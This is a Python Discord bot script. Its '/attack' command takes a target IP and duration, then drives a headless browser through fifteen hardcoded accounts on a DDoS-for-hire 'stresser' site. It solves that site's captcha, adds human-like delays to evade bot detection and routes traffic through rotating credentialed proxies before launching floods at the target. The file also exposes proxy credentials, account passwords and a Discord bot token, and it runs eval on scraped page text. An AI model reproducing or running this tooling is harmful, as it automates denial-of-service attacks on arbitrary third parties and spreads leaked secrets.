import random
import nextcord
from nextcord.ext import commands
from playwright.async_api import async_playwright
import asyncio

async def install_playwright():
    """Install Playwright and its browsers if not already installed."""
    try:
        # Install Playwright
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'playwright'])
        print("Playwright installed successfully.")

        # Install browser binaries
        subprocess.check_call([sys.executable, '-m', 'playwright', 'install'])
        print("Browser binaries installed successfully.")

    except subprocess.CalledProcessError as e:
        print(f"An error occurred while installing: {e}")

# Initialize the bot
intents = nextcord.Intents.default()
bot = commands.Bot(command_prefix='!', intents=intents)

# Example of an event definition
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')

# List of proxies with credentials
PROXIES = [
    "skibidiiii:ni91857195@38.154.227.167:5868",
    "skibidiiii:ni91857195@198.23.239.134:6540",
    "skibidiiii:ni91857195@207.244.217.165:6712",
    "skibidiiii:ni91857195@107.172.163.27:6543",
    "skibidiiii:ni91857195@173.211.0.148:6641",
    "skibidiiii:ni91857195@167.160.180.203:6754",
    "skibidiiii:ni91857195@104.239.105.125:6655",
    "skibidiiii:ni91857195@154.36.110.199:6853",
    "skibidiiii:ni91857195@45.151.162.198:6600",
    "skibidiiii:ni91857195@206.41.172.74:6634"
]


# Human-like delay to avoid bot detection
async def human_delay(min_time=0.5, max_time=1.5):
    await asyncio.sleep(random.uniform(min_time, max_time))

# Function to solve the math question using eval
def solve_math_question(question):
    try:
        # Clean the input by extracting only digits and operators
        clean_question = ''.join(filter(lambda x: x.isdigit() or x in "+-* /", question))
        return eval(clean_question)
    except Exception as e:
        print(f"Error solving the math question: {e}")
        return None

@bot.slash_command(name="attack", description="Launch attacks with specified IP and time")
async def attack(interaction: nextcord.Interaction, ip: str, time_value: int):
    # Check if the user has the required role
    if 1289636469778022491 not in [role.id for role in interaction.user.roles]:
        await interaction.response.send_message("You do not have the required role to use this command.", ephemeral=True)
        return

    await interaction.response.send_message("Starting the attack process...")

    accounts = [
        {"username": "c1fsa", "password": "Collin0987!!"},
        {"username": "c1fsa1", "password": "Collin0987!!"},
        {"username": "c1fsa2", "password": "Collin0987!!"},
        {"username": "c1fsa3", "password": "Collin0987!!"},
        {"username": "c1fsa4", "password": "Collin0987!!"},
        {"username": "c1fsa5", "password": "Collin0987!!"},
        {"username": "c1fsa6", "password": "Collin0987!!"},
        {"username": "c1fsa7", "password": "Collin0987!!"},
        {"username": "c1fsa8", "password": "Collin0987!!"},
        {"username": "c1fsa9", "password": "Collin0987!!"},
        {"username": "c1fsa11", "password": "Collin0987!!"},
        {"username": "c1fsa12", "password": "Collin0987!!"},
        {"username": "c1fsa13", "password": "Collin0987!!"},
        {"username": "c1fsa14", "password": "Collin0987!!"},
        {"username": "c1fsa15", "password": "Collin0987!!"}
    ]

    tasks = []
    for account in accounts:
        task = asyncio.create_task(launch_attack(account, ip, time_value))
        tasks.append(task)

    await asyncio.gather(*tasks)  # Wait for all tasks to complete

    # Create an embed response
    embed = nextcord.Embed(
        title="Attack Status",
        description="Attacks sent",
        color=nextcord.Color.from_rgb(0, 0, 0)  # Black color
    )
    embed.set_footer(text="Made by s9ar & Neo.")

    await interaction.followup.send(embed=embed)


async def launch_attack(account, ip, time_value):
    proxy = random.choice(PROXIES)  # Assuming PROXIES is defined somewhere in your code
    print(f"Using proxy: {proxy}")

    async with async_playwright() as p:
        # Launch the browser with the selected proxy
        browser = await p.chromium.launch(headless=True, proxy={'server': f'http://{proxy}'})
        page = await browser.new_page()

        print("Navigating to the login page...")
        await page.goto("https://redstresser.org/login")

        # Wait for the page to load
        await page.wait_for_selector('#username', timeout=60000)  # Wait up to 60s

        print(f"Filling in the username: {account['username']}")
        await page.fill('#username', account['username'])
        await human_delay()  # Simulate human typing

        print(f"Filling in the password for {account['username']}...")
        await page.fill('#password', account['password'])
        await human_delay()  # Simulate human typing

        print("Reading the math question...")
        question_text = await page.locator('#question').evaluate('element => element.placeholder')
        question_text = question_text.strip()
        print(f"Question to solve: {question_text}")

        answer = solve_math_question(question_text)

        if answer is None:
            print("Unable to solve math question automatically. Please respond with the answer.")
            # Handle case where the answer cannot be automatically calculated if needed.

        await page.fill('#question', str(answer))
        await human_delay()  # Simulate human typing

        print("Clicking the Sign In button...")
        await page.click('#login')

        # Wait for a bit to observe results
        await page.wait_for_timeout(5000)  # 5 seconds delay to observe the result

        # Navigate to the hub
        print("Navigating to the hub...")
        await page.goto("https://redstresser.org/hub")

        # Scroll down the page about 90%
        print("Scrolling down the page...")
        scroll_height = await page.evaluate('document.body.scrollHeight')
        current_scroll_position = 0
        scroll_increment = 200  # Amount to scroll each time

        while current_scroll_position < scroll_height:
            await page.evaluate(f'window.scrollTo(0, {current_scroll_position + scroll_increment})')
            current_scroll_position += scroll_increment
            await human_delay(1)  # Delay to allow content to load
            scroll_height = await page.evaluate('document.body.scrollHeight')  # Update scroll height

        # Fill in the IP address
        await page.fill('#host', ip)  # Use the provided IP address
        await human_delay()  # Simulate human typing

        # Always set the port to 80
        await page.fill('#port', '80')
        await human_delay()  # Simulate human typing

        # Fill the time from the argument
        await page.fill('#time', str(time_value))  # Use the provided time
        await human_delay()  # Simulate human typing

        # Fill total servers as 1
        await page.fill('#totalservers', '1')
        await human_delay()  # Simulate human typing

        print(f"Clicking the Launch Attack button for {account['username']}...")
        await page.click('#hit')

        print(f"Attack launched for {account['username']}.")
        await browser.close()  # Close the browser after the attack is launched


bot.run('MTI4OTYyMjk4MjY0NTI1NjI2NQ.Gm8WHo.yzStdpqD90DFKmTWNTjZyGk_yN4jetntcws5Ss')
